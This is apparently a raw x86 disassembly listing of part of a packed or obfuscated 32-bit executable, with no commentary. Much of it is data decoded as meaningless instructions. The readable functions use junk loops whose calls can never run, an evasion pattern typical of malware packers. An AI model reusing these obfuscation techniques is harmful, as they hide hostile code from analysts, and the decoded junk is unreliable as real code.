  405939:	pushf  
  40593a:	loopne 0x40597e
  40593c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40593d:	jno    0x405951
  40593f:	push   esi
  405940:	mov    cl,0x8c
  405942:	ins    BYTE PTR es:[edi],dx
  405943:	and    eax,0xce1bbafa
  405948:	fs pop ss
  40594a:	mov    bh,bl
  40594c:	mov    ds:0xa2004de9,al
  405951:	xchg   ebx,eax
  405952:	or     eax,0xb0c7a8f2
  405957:	inc    edx
  405958:	xchg   ebx,eax
  405959:	test   eax,0x39789874
  40595f:	dec    ebp
  405960:	cs sti 
  405962:	mov    WORD PTR [ebx+0x455ccc3],es
  405968:	in     eax,dx
  405969:	stos   DWORD PTR es:[edi],eax
  40596a:	cmp    BYTE PTR [edi+0x21ff7154],bl
  405970:	add    al,cl
  405972:	outs   dx,DWORD PTR ds:[esi]
  405973:	aam    0xa6
  405975:	repz into 
  405977:	pop    ecx
  405978:	sbb    BYTE PTR [ebx+edx*8+0x3d5ae9e6],0x48
  405980:	or     esi,ecx
  405982:	sbb    al,0x77
  405984:	lahf   
  405985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405986:	fstp   DWORD PTR [edx+0x11e67689]
  40598c:	cmp    al,0x5d
  40598e:	adc    DWORD PTR [esi-0x73],eax
  405991:	xchg   edi,eax
  405992:	in     al,0xf
  405994:	mov    eax,ds:0xd689b839
  405999:	xchg   ecx,eax
  40599a:	dec    ecx
  40599b:	xchg   edi,eax
  40599c:	sar    DWORD PTR [esi],cl
  40599e:	nop
  40599f:	mov    ch,0x3
  4059a1:	test   al,0xf8
  4059a3:	push   esi
  4059a4:	shr    BYTE PTR ds:0x6ce4421c,cl
  4059aa:	sub    edi,DWORD PTR [ecx]
  4059ac:	sbb    BYTE PTR [edi],ch
  4059ae:	push   es
  4059af:	dec    esp
  4059b0:	mov    ah,0x4b
  4059b2:	mov    al,0x10
  4059b4:	xlat   BYTE PTR ds:[ebx]
  4059b5:	push   ecx
  4059b6:	bound  ebp,QWORD PTR [ebp-0x56]
  4059b9:	push   edi
  4059ba:	fbstp  TBYTE PTR [esi-0x1b]
  4059bd:	fmul   DWORD PTR [ebx+0x40d64c0d]
  4059c3:	add    BYTE PTR [ecx],al
  4059c5:	or     BYTE PTR [edi+0x5e],bl
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4245b6
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417e4d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417e55,0x17
  4059ee:	cmp    DWORD PTR ds:0x417e55,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417e55,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417e45
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417e55,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417e55
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417e55,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417e55
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417e55,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417e41,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4245b2
  405a75:	and    DWORD PTR ds:0x41abd6,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41510d
  405a9d:	sbb    DWORD PTR ds:0x4245be,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x412354,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	mov    bl,0x37
  405ac5:	sub    DWORD PTR [edx+0x7e7e0b86],esp
  405acb:	and    edi,DWORD PTR [edi+0x7e]
  405ace:	jle    0x405a90
  405ad0:	or     DWORD PTR [edi-0x79],eax
  405ad3:	fsubr  DWORD PTR [ebx-0x13]
  405ad6:	les    ebx,FWORD PTR [ebx]
  405ad8:	fsubr  QWORD PTR [eax]
  405ada:	mov    edi,0xd60d6ec5
  405adf:	dec    esi
  405ae0:	das    
  405ae1:	or     ebp,DWORD PTR [ebx+0x1d]
  405ae4:	xchg   esp,eax
  405ae5:	pushf  
  405ae6:	sti    
  405ae7:	stos   DWORD PTR es:[edi],eax
  405ae8:	(bad)  
  405ae9:	sbb    eax,0xd3c6581e
  405aee:	mov    ds:0xede8d521,al
  405af3:	inc    edi
  405af4:	or     DWORD PTR [ebx-0x23],esp
  405af7:	jle    0x405b3d
  405af9:	mov    WORD PTR [esi-0x79],ds
  405afc:	push   ebp
  405afd:	in     al,0xb3
  405aff:	mov    ah,0xe6
  405b01:	jmp    0x71fc:0x46071049
  405b08:	inc    esp
  405b09:	xor    al,0xcf
  405b0b:	stc    
  405b0c:	mov    esi,0x2b3ef3fa
  405b11:	jp     0x405b86
  405b13:	cmp    ecx,eax
  405b15:	mov    edx,0x3d0caf62
  405b1a:	(bad)  
  405b1b:	mov    esi,0x30111b79
  405b20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b21:	mov    WORD PTR [eax],?
  405b23:	push   ebx
  405b24:	or     BYTE PTR [esi+0x13cc7c65],dh
  405b2a:	pshufw mm0,QWORD PTR [ebx+0x7f],0xd3
  405b2f:	inc    eax
  405b30:	cmp    al,0x2b
  405b32:	das    
  405b33:	in     eax,0x41
  405b35:	repnz push 0x91ffeb10
  405b3b:	inc    edi
  405b3c:	or     BYTE PTR [esi],dl
  405b3e:	iret   
  405b3f:	rep outs dx,BYTE PTR ds:[esi]
  405b41:	add    BYTE PTR [esi],bh
  405b43:	xchg   DWORD PTR [ebx+0x4f],edx
  405b46:	or     eax,0x9f19a18b
  405b4b:	test   al,0x5e
  405b4d:	mov    edx,0x4ada82aa
  405b52:	fidiv  DWORD PTR [ecx+0x5]
  405b55:	jecxz  0x405b0e
  405b57:	xchg   ecx,eax
  405b58:	jnp    0x405b7d
  405b5a:	nop
  405b5b:	int3   
  405b5c:	sub    eax,0x6e049fc8
  405b61:	ds mov ecx,0x5925f142
  405b67:	std    
  405b68:	out    dx,al
  405b69:	xchg   ebx,eax
  405b6a:	(bad)  
  405b6c:	jnp    0x405af3
  405b6e:	js     0x405b77
  405b70:	jp     0x405b68
  405b72:	jae    0x405be7
  405b74:	add    BYTE PTR [ecx+0x65],al
  405b77:	out    dx,al
  405b78:	push   ebx
  405b79:	and    al,0xc1
  405b7b:	mov    bh,0x22
  405b7d:	fsub   DWORD PTR [ebx]
  405b7f:	jge    0x405b9f
  405b81:	add    BYTE PTR [edi+0x11b98fcc],ah
  405b87:	dec    ecx
  405b88:	mov    ebp,0x6447f247
  405b8d:	test   BYTE PTR gs:[esi-0x73],bl
  405b91:	pop    ss
  405b92:	call   0x456e:0x83385ba2
  405b99:	adc    ecx,esi
  405b9b:	ins    DWORD PTR es:[edi],dx
  405b9c:	jne    0x405bbb
  405b9e:	mov    WORD PTR [edx],gs
  405ba0:	push   esp
  405ba1:	stos   DWORD PTR es:[edi],eax
  405ba2:	push   eax
  405ba3:	jbe    0x405ba3
  405ba5:	cmp    bh,BYTE PTR [edx]
  405ba7:	stc    
  405ba8:	and    ah,BYTE PTR ds:0x355e6571
  405bae:	push   ebx
  405baf:	popa   
  405bb0:	mov    ds:0x6d973239,eax
  405bb5:	jae    0x405b41
  405bb7:	imul   ebx,edx,0xffffff9c
  405bba:	dec    esi
  405bbb:	sub    DWORD PTR [edx-0x6c],0x10
  405bbf:	cmp    DWORD PTR [esi-0x5c],esp
  405bc2:	adc    dh,ch
  405bc4:	fwait
  405bc5:	or     BYTE PTR [edx+0x59b1b1f0],0x99
  405bcc:	addr16 das 
  405bce:	cwde   
  405bcf:	loope  0x405bc1
  405bd1:	push   es
  405bd2:	cmp    al,0x8d
  405bd4:	sbb    DWORD PTR [eax+0x3b53a9ad],ebx
  405bda:	push   ebx
  405bdb:	or     BYTE PTR [edi+0x15],ch
  405bde:	sub    al,0x6a
  405be0:	inc    esi
  405be1:	sbb    DWORD PTR [esi-0x5eee044],0x56
  405be8:	dec    ecx
  405be9:	add    cl,BYTE PTR [ecx-0x380e17cb]
  405bef:	test   al,0xcd
  405bf1:	mov    ch,0x3c
  405bf3:	fwait
  405bf4:	xor    DWORD PTR [ebp-0x7f],0xffffffea
  405bf8:	mov    esi,0xb1a2127d
  405bfd:	and    eax,0x9da4755
  405c02:	dec    ebx
  405c03:	dec    ebp
  405c04:	mov    edx,DWORD PTR [ebp+0x8]
  405c07:	and    DWORD PTR ds:0x4245c6,0x0
  405c11:	jmp    0x405c25
  405c16:	xor    edi,edi
  405c18:	or     edi,DWORD PTR ds:0x4245c6
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4245c6,edi
  405c25:	cmp    DWORD PTR ds:0x4245c6,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4245c6,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x412358,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	hlt    
  405c69:	cmp    DWORD PTR [ebx+ebp*1+0x7e7e084b],0x7e7e7f23
  405c74:	cmp    al,0x19
  405c76:	xor    ebp,ecx
  405c78:	sbb    al,0xa7
  405c7a:	jns    0x405c2f
  405c7c:	hlt    
  405c7d:	iret   
  405c7e:	inc    ebp
  405c7f:	mov    esp,0x2e7d6ba9
  405c84:	dec    ecx
  405c85:	sub    DWORD PTR [esi],ebx
  405c87:	mov    ah,0xd5
  405c89:	push   edi
  405c8a:	xor    edi,DWORD PTR [ebx+eiz*1]
  405c8d:	xor    ebp,edi
  405c8f:	pop    ecx
  405c90:	outs   dx,BYTE PTR ds:[esi]
  405c91:	gs call 0x579ce98f
  405c97:	add    ah,BYTE PTR [ecx]
  405c99:	test   DWORD PTR [edi+eax*1-0x1c],edx
  405c9d:	outs   dx,DWORD PTR ds:[esi]
  405c9e:	mov    ecx,0x7b0aba9a
  405ca3:	int3   
  405ca4:	test   BYTE PTR [ebp-0x7a],0x11
  405ca8:	bound  esi,QWORD PTR [edi+0x1a16c0eb]
  405cae:	cmp    DWORD PTR [edi+esi*1-0x151e5373],edi
  405cb5:	push   cs
  405cb6:	in     eax,0xa7
  405cb8:	jne    0x405c7e
  405cba:	jp     0x405cc7
  405cbc:	or     eax,0x1bc9e4b
  405cc1:	loopne 0x405c8a
  405cc3:	xor    edi,eax
  405cc5:	jb     0x405cee
  405cc7:	push   ebx
  405cc8:	push   cs
  405cc9:	and    DWORD PTR [edx],ebx
  405ccb:	dec    edi
  405ccc:	test   BYTE PTR [edx+0x59],ah
  405ccf:	addr16 mov edx,0x74965347
  405cd5:	jnp    0x405d2c
  405cd7:	cdq    
  405cd8:	ffree  st(3)
  405cda:	repz sub DWORD PTR [esi+0x590ac73f],esp
  405ce1:	fnstsw WORD PTR [ecx-0x3d]
  405ce4:	cmp    ch,BYTE PTR [ebx-0x71]
  405ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ce8:	cmp    BYTE PTR [edi-0x5],ah
  405ceb:	jnp    0x405cab
  405ced:	jno    0x405cf1
  405cef:	adc    al,BYTE PTR [ebp-0x5406e9c]
  405cf5:	fidiv  DWORD PTR [ecx+0x60]
  405cf8:	pop    es
  405cf9:	daa    
  405cfa:	test   eax,0xe1149d7f
  405cff:	xchg   edx,eax
  405d00:	ins    DWORD PTR es:[edi],dx
  405d01:	rcl    edi,cl
  405d03:	mov    esi,0xd8448b4b
  405d08:	je     0x405d5f
  405d0a:	cmp    ebp,DWORD PTR [edi-0x19cc6267]
  405d10:	lds    edi,FWORD PTR [edi-0x61]
  405d13:	shl    BYTE PTR [ebx],1
  405d15:	imul   eax,esi,0x2db62cf0
  405d1b:	nop
  405d1c:	adc    edi,eax
  405d1e:	stos   BYTE PTR es:[edi],al
  405d1f:	and    al,0x43
  405d21:	fidiv  DWORD PTR [ebx-0x1c7f98f2]
  405d27:	mov    BYTE PTR [ecx+edx*4],dl
  405d2a:	leave  
  405d2b:	test   BYTE PTR [ecx-0x26],bl
  405d2e:	inc    esp
  405d2f:	iret   
  405d30:	imul   edx,ecx,0xa7ba13f8
  405d36:	into   
  405d37:	cmp    eax,0x2d8040b8
  405d3c:	adc    BYTE PTR [ecx],cl
  405d3e:	push   edi
  405d3f:	sbb    edi,edi
  405d41:	leave  
  405d42:	leave  
  405d43:	cmp    BYTE PTR ds:0x232231b8,bh
  405d49:	inc    ecx
  405d4a:	adc    dh,dh
  405d4c:	ins    BYTE PTR es:[edi],dx
  405d4d:	sbb    BYTE PTR [edi-0x7c98991b],al
  405d53:	mov    cl,BYTE PTR [eax+0x1ae0dda0]
  405d59:	jnp    0x405d47
  405d5b:	mov    esi,0x4d7d5a0a
  405d60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d61:	out    0x5,eax
  405d63:	push   ebp
  405d64:	pop    es
  405d65:	cld    
  405d66:	sahf   
  405d67:	or     edi,ebp
  405d69:	daa    
  405d6a:	mov    edx,0x6274b355
  405d6f:	icebp  
  405d70:	mov    ecx,0xb51bd1a9
  405d75:	pop    ecx
  405d76:	adc    eax,0xe3e94cfe
  405d7b:	jno    0x405dfa
  405d7d:	bound  edi,QWORD PTR [edx+ecx*1+0x34]
  405d81:	outs   dx,DWORD PTR ds:[esi]
  405d82:	std    
  405d83:	out    0x5e,al
  405d85:	inc    ebx
  405d86:	mov    ebp,0xfb506f5
  405d8b:	ficomp DWORD PTR [esi+0x73]
  405d8e:	jecxz  0x405d40
  405d90:	fsub   QWORD PTR [esi+0x48a33c0a]
  405d96:	dec    eax
  405d97:	push   0xffffffc0
  405d99:	xor    DWORD PTR [ebp+0x56],ebx
  405d9c:	push   esp
  405d9d:	dec    esp
  405d9e:	xor    cl,bl
  405da0:	xor    al,0x84
  405da2:	ins    BYTE PTR es:[edi],dx
  405da3:	jns    0x405e20
  405da5:	pop    ds
  405da6:	mov    ?,ecx
  405da8:	mov    al,ds:0x470c5589
  405dad:	jmp    0x405eff
  405db2:	or     eax,0xb8afae9b
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	fbstp  TBYTE PTR [edx-0x1f]
  405dc1:	nop
  405dc2:	jl     0x405dd2
  405dc4:	jle    0x405e44
  405dc6:	and    edi,DWORD PTR [edi+0x7e]
  405dc9:	jle    0x405df3
  405dcb:	sbb    al,0x8b
  405dcd:	fs popf 
  405dcf:	push   eax
  405dd0:	push   edi
  405dd1:	aaa    
  405dd2:	inc    esp
  405dd3:	je     0x405e0a
  405dd5:	push   ecx
  405dd6:	inc    ecx
  405dd7:	xchg   ecx,edi
  405dd9:	inc    edx
  405dda:	add    dh,al
  405ddc:	ins    DWORD PTR es:[edi],dx
  405ddd:	nop
  405dde:	test   esp,ecx
  405de0:	gs scas eax,DWORD PTR es:[edi]
  405de2:	cli    
  405de3:	jne    0x405dca
  405de5:	mov    BYTE PTR [ecx+edi*1-0x29],al
  405de9:	jne    0x405d88
  405deb:	adc    al,0xfb
  405ded:	and    DWORD PTR [eax-0x47],ebp
  405df0:	dec    eax
  405df1:	pop    ss
  405df2:	scas   eax,DWORD PTR es:[edi]
  405df3:	add    DWORD PTR gs:[ecx-0x32],eax
  405df7:	test   ebp,esp
  405df9:	cdq    
  405dfa:	or     edi,DWORD PTR [edi-0x4d]
  405dfd:	pusha  
  405dfe:	shl    BYTE PTR [ecx-0x62],1
  405e01:	je     0x405e6d
  405e03:	push   ds
  405e04:	xchg   esp,eax
  405e05:	or     eax,0x62042f4d
  405e0a:	mov    ah,0x4b
  405e0c:	jl     0x405da0
  405e0e:	in     al,dx
  405e0f:	addr16 add eax,0xbd28e2e6
  405e15:	shr    BYTE PTR [eax+0x56],cl
  405e18:	sbb    edx,edi
  405e1a:	mov    ds,WORD PTR ds:0xc340fe5
  405e20:	cmc    
  405e21:	call   0x69e381c2
  405e26:	adc    DWORD PTR [edx+0x3796925e],esi
  405e2c:	push   ds
  405e2d:	arpl   WORD PTR [edi+0x2add0394],cx
  405e33:	ret    0xd47c
  405e36:	pop    es
  405e37:	cmp    ebx,esi
  405e39:	or     DWORD PTR [ebx],0xa6da0dfb
  405e3f:	je     0x405e7c
  405e41:	adc    dl,BYTE PTR [esi-0x3d]
  405e44:	rcl    DWORD PTR [ecx],0x5a
  405e47:	jmp    0x52b04e26
  405e4c:	ss clc 
  405e4e:	jmp    0x405e3c
  405e50:	sbb    cl,BYTE PTR [edi]
  405e52:	push   cs
  405e53:	sbb    al,0x62
  405e55:	jecxz  0x405e3b
  405e57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e58:	aaa    
  405e59:	test   BYTE PTR [eax+0x27],al
  405e5c:	aad    0xb1
  405e5e:	loope  0x405edb
  405e60:	pop    edx
  405e61:	dec    edi
  405e62:	(bad)
  405e65:	push   ebx
  405e66:	cmp    edx,DWORD PTR [edi-0x74]
  405e69:	call   0xb227:0x8540e524
  405e70:	outs   dx,BYTE PTR ds:[esi]
  405e71:	sbb    DWORD PTR [ebx-0xbff2ef3],ebp
  405e77:	mov    esp,0x50ab0030
  405e7c:	sbb    bl,BYTE PTR [edi+edi*2+0x1e]
  405e80:	sbb    edx,edx
  405e82:	out    dx,eax
  405e83:	sub    bl,BYTE PTR [ebp-0x58f2024f]
  405e89:	inc    ecx
  405e8a:	mov    al,0x9e
  405e8c:	jnp    0x405e37
  405e8e:	call   FWORD PTR es:[ebx+edx*1]
  405e92:	cmp    al,0x44
  405e94:	jg     0x405e16
  405e96:	rol    esp,cl
  405e98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e99:	cmp    bl,cl
  405e9b:	test   al,0xa0
  405e9d:	sbb    BYTE PTR [ecx],ch
  405e9f:	into   
  405ea0:	inc    esi
  405ea1:	add    eax,0xe83483b4
  405ea6:	sbb    eax,0x9c96cbc3
  405eab:	add    DWORD PTR [edx],0x898347a5
  405eb1:	sahf   
  405eb2:	cwde   
  405eb3:	call   0xbf942880
  405eb8:	cmp    eax,0x4ba3258d
  405ebd:	adc    edx,DWORD PTR [ebx-0x24]
  405ec0:	scas   eax,DWORD PTR es:[edi]
  405ec1:	dec    esp
  405ec2:	mov    al,0xc1
  405ec4:	xor    DWORD PTR [edx-0x7cc92bd6],esp
  405eca:	and    dl,BYTE PTR [ebp+0x6c]
  405ecd:	adc    al,0x83
  405ecf:	fs and eax,0xa12f976d
  405ed5:	mov    esp,0x55c845ca
  405eda:	lods   al,BYTE PTR ds:[esi]
  405edb:	dec    eax
  405edc:	sub    BYTE PTR [eax+0x551f99b4],bh
  405ee2:	push   ds
  405ee3:	(bad)  
  405ee4:	repnz data16 fsubr DWORD PTR [ecx+0x7d85dadd]
  405eec:	arpl   WORD PTR [esi+0x6498eab8],di
  405ef2:	dec    esp
  405ef3:	repnz imul ecx,DWORD PTR [ecx-0x4d],0x21
  405ef8:	retf   0x2791
  405efb:	clc    
  405efc:	pop    es
  405efd:	jae    0x405ec2
  405eff:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  405f06:	xor    edi,edi
  405f08:	xor    edi,DWORD PTR ds:0x415109
  405f0e:	adc    edi,DWORD PTR ds:0x4245ae
  405f14:	mov    DWORD PTR ds:0x415109,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4245be,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417e41,0x15
  405f48:	cmp    DWORD PTR ds:0x417e41,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417e41,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41ac41
  405f6c:	push   0x41ac72
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417e41,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417e41
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417e41,edi
  405f96:	mov    edi,DWORD PTR ds:0x417e41
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417e41,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417e4d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x412364,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417e49,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417e55,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417e55
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417e55,edi
  405fef:	cmp    DWORD PTR ds:0x417e55,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417e55,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412378
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x412368,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415109,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0x7cdb13c5
  406054:	fwait
  406055:	shr    BYTE PTR [esi+0x21],0xf
  406059:	jle    0x4060d9
  40605b:	and    edi,DWORD PTR [edi+0x7e]
  40605e:	jle    0x405ff1
  406060:	mov    BYTE PTR [esi+0x50b66bb5],bl
  406066:	and    BYTE PTR [edi-0x64],ch
  406069:	add    dl,BYTE PTR [ebp-0x3589a649]
  40606f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406070:	xor    BYTE PTR [ebp-0x4],dh
  406073:	and    edx,DWORD PTR [ecx]
  406075:	(bad)  
  406076:	pop    esi
  406077:	les    ebp,FWORD PTR [esi]
  406079:	stc    
  40607a:	outs   dx,DWORD PTR ds:[esi]
  40607b:	add    al,0x63
  40607d:	sub    DWORD PTR [ebx-0x298c0011],esp
  406083:	retf   0x3196
  406086:	add    DWORD PTR [ebp-0x188bf293],esi
  40608c:	inc    ebp
  40608d:	mov    bl,0xf3
  40608f:	ror    al,1
  406091:	sahf   
  406092:	add    BYTE PTR [esi-0x70],cl
  406095:	adc    DWORD PTR [ebp-0x5d],ebx
  406098:	or     DWORD PTR [eax+0x5a],ebp
  40609b:	repz mov bl,0x22
  40609e:	mov    al,ds:0x5e62c615
  4060a3:	imul   esi,DWORD PTR [eax-0x7e],0xffffffe0
  4060a7:	mov    ebp,0xbc32d2dd
  4060ac:	ret    
  4060ad:	cli    
  4060ae:	retf   
  4060af:	jg     0x40605a
  4060b1:	adc    BYTE PTR [edi-0x1e],dl
  4060b4:	aaa    
  4060b5:	push   0xebed8a0d
  4060ba:	pop    ecx
  4060bb:	push   esi
  4060bc:	push   0xffffffe2
  4060be:	data16 cmp BYTE PTR [eax-0x72b13bbc],ch
  4060c5:	(bad)  
  4060c6:	or     DWORD PTR [edi+0x54],esi
  4060c9:	leave  
  4060ca:	fdivr  st,st(1)
  4060cc:	mov    bl,0x9b
  4060cf:	push   es
  4060d0:	rcr    BYTE PTR [ebx-0x2d],cl
  4060d3:	push   ecx
  4060d4:	add    edi,DWORD PTR [eax]
  4060d6:	loop   0x40611f
  4060d8:	fild   WORD PTR [ecx-0x7c66fe0b]
  4060de:	out    0x40,eax
  4060e0:	adc    BYTE PTR [edx],dh
  4060e2:	repnz mov ecx,0x64808009
  4060e8:	lds    esi,FWORD PTR [eax+0x368fa954]
  4060ee:	test   DWORD PTR [esi-0x1bf355ca],ecx
  4060f4:	mov    dh,0x58
  4060f6:	xlat   BYTE PTR ds:[ebx]
  4060f7:	inc    ebx
  4060f8:	dec    edx
  4060f9:	adc    esp,DWORD PTR [eax*8+0x4a125a7c]
  406100:	xor    al,0xb2
  406102:	xchg   edi,eax
  406103:	push   ds
  406104:	mov    al,0xae
  406106:	jg     0x406172
  406108:	cmp    eax,0xebb4ed83
  40610d:	fnsave [edi]
  40610f:	rol    DWORD PTR [edi-0x28],0x8f
  406113:	pop    es
  406114:	push   edi
  406115:	std    
  406116:	pop    ds
  406117:	push   esp
  406118:	adc    eax,DWORD PTR [ecx+eiz*2]
  40611b:	(bad)  
  40611c:	cld    
  40611d:	aam    0xb6
  40611f:	mov    edi,0x3267c985
  406124:	inc    ecx
  406125:	push   edi
  406126:	stos   DWORD PTR es:[edi],eax
  406127:	push   esi
  406128:	ret    
  406129:	pop    esi
  40612a:	imul   eax,DWORD PTR [eax],0xf7ff1741
  406130:	fistp  DWORD PTR [eax+0xa]
  406133:	inc    edx
  406134:	dec    eax
  406135:	push   ds
  406136:	push   es
  406137:	outs   dx,BYTE PTR ds:[esi]
  406138:	push   ebp
  406139:	fwait
  40613a:	mov    cl,0xc
  40613c:	jmp    0x4060e3
  40613e:	jmp    0xba30:0x83e85e74
  406145:	mov    ah,0xcc
  406147:	sub    edi,edi
  406149:	pop    es
  40614a:	sbb    BYTE PTR [ebx-0x19],0x15
  40614e:	sar    BYTE PTR [ebp-0x673b5c35],0x4a
  406155:	mov    WORD PTR [edx+0x13],ds
  406158:	loop   0x40611a
  40615a:	repz jb 0x406137
  40615d:	lahf   
  40615e:	fisttp WORD PTR [esi-0x13]
  406161:	(bad)  [ebx]
  406163:	(bad)  
  406164:	sub    BYTE PTR [ebp-0x30298c8e],cl
  40616a:	in     eax,0x31
  40616c:	mov    dh,0xe2
  40616e:	xchg   ebx,eax
  40616f:	sti    
  406170:	xchg   edi,eax
  406171:	imul   edi,DWORD PTR [esi],0xf4b04338
  406177:	rol    BYTE PTR [ecx+ecx*2+0x1f],0xfc
  40617c:	add    dl,0x7a
  40617f:	xchg   BYTE PTR [esi-0x2b8664cc],ah
  406185:	into   
  406186:	lea    edx,[esi+0x6a3a9288]
  40618c:	shl    DWORD PTR [edi-0x7d93c45a],1
  406192:	mov    ch,BYTE PTR [ecx]
  406194:	push   ebx
  406195:	jmp    0x40715f
  40619a:	and    DWORD PTR ds:0x412370,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412370
  4061af:	inc    edx
  4061b0:	mov    DWORD PTR ds:0x412370,edx
  4061b6:	cmp    DWORD PTR ds:0x412370,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412370,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41acf1
  4061d8:	push   0x41ac28
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x412364,0x11
  4061f7:	cmp    DWORD PTR ds:0x412364,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x412364,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x412364
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x412364,edi
  406234:	jmp    0x4061f7
  406239:	mov    edi,DWORD PTR [ebp-0x10]
  40623c:	or     DWORD PTR ds:0x41235c,0x6f22
  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4245b2,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
